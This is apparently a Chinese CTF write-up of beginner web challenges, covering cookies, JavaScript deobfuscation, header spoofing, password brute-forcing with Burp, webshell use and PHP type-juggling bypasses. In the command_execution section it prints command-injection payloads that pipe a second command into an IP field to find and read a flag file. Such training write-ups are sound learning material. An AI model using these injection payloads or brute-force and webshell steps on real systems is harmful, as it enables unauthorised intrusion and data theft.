# WEB Exercise Area

## 0x00 前言

把一直想填的WEB WP坑填了一下
发现有些题又不会做了。。。。

收货：

- hackbar的基本使用方法
- burp Intruder的爆破方法
- 菜刀的使用

Todo:

- js逻辑的分析
- php隐式类型转换的其他“漏洞”

## 0x01 view_source

chrome 浏览器直接加 view-source:头

## 0x02 get_post

用hackbar或者burp方便的修改get和post值

![](/assets/images/0x02.jpg)

## 0x03 robots

访问robots.txt 什么不让爬虫访问我们访问什么。。。。。

## 0x04 backup

考察一般备份文件的后缀名是 .bak

## 0x05 Cookie

考Cookie就看Cookie

console里

```javascript
alert(document.cookie)
```

提示访问cookie.php

提示看http response

在Chrome DevTool Network里查看请求头

得到flag

## 0x06 disabled_button

把button的disable属性去了

## 0x07 simple_js

Simple吗？我好菜啊。。。。。

F12看到源代码里有如下脚本

```js
    function dechiffre(pass_enc){
        var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";
        var tab  = pass_enc.split(',');
                var tab2 = pass.split(',');var i,j,k,l=0,m,n,o,p = "";i = 0;j = tab.length;
                        k = j + (l) + (n=0);
                        n = tab2.length;
                        for(i = (o=0); i < (k = j = n); i++ ){o = tab[i-l];p += String.fromCharCode((o = tab2[i]));
                                if(i == 5)break;}
                        for(i = (o=0); i < (k = j = n); i++ ){
                        o = tab[i-l];
                                if(i > 5 && i < k-1)
                                        p += String.fromCharCode((o = tab2[i]));
                        }
        p += String.fromCharCode(tab2[17]);
        pass = p;return pass;
    }
    String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));

    h = window.prompt('Enter password');
    alert( dechiffre(h) );
```

一开始直接打

```js
console.log(dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"))
```

发现出来的就是错误提示信息

后来想想也是

参数pass_enc根本没用啊

p+的都是tab\[2\]的值，而tab\[2\]里的都是x35的值。。。。

所以改写了一下脚本

```js
    function dechiffre(pass_enc){
        var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";
        var tab2  = pass_enc.split(',');//交换tab1 tab2
                var tab = pass.split(',');var i,j,k,l=0,m,n,o,p = "";i = 0;j = tab.length;
                        k = j + (l) + (n=0);
                        n = tab2.length;
                        for(i = (o=0); i < (k = j = n); i++ ){o = tab[i-l];p += String.fromCharCode((o = tab2[i]));
                                if(i == 5)break;}
                        for(i = (o=0); i < (k = j = n); i++ ){
                        o = tab[i-l];
                                if(i > 5 && i < k-1)
                                        p += String.fromCharCode((o = tab2[i]));
                        }
        p += String.fromCharCode(tab2[17]);
        pass = p;return pass;
    }
alert(dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"))
```

得到flag:786OsErtk1

但是还是不对。。。。(Todo占坑)

看了大佬的wp发现少了最后一位。。。。。

事实上，通过分析函数逻辑可以将其转换为如下的js代码

```js
function dechiffre() {
    var pass = "\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30";
    var tab2 = pass.split(',');
    var i;
    var p = "";
    for (i = 0; i < tab2.length; i++) {
        p += String.fromCharCode(tab2[i]);
    }
    return p;
}
alert(dechiffre());
```

flag:786OsErtk12

## 0x08 xff_referer

Hackbar真是个好东西

在Hackbar里加两个Header

Referer: [https://www.google.com](https://www.google.com/)

X-Forwarded-For：123.123.123.123

## 0x09 weak_auth

提示弱密码

用burp_suite 字典爆破

![](/assets/images/intruder.jpg)

## 0x0A webshell

直接有webshell也给webshell密码了 菜刀连一下

然后直接下载flag.txt

## 0x0B command_execution

直接显示命令调用情况了 用管道符 “|”连接两个命令

先找一下flag位置

```
payload=1.1.1.1 | find / -name flag*
```

然后再cat

```
payload=1.1.1.1 | cat /home/flag.txt
```

## 0x0C simple_php

php弱类型比较绕过 字符串和数字比较时会把字符串能转数字的部分转成数字

```
payload=http://111.198.29.45:47621/?a=[]&b=1235aaaaa
```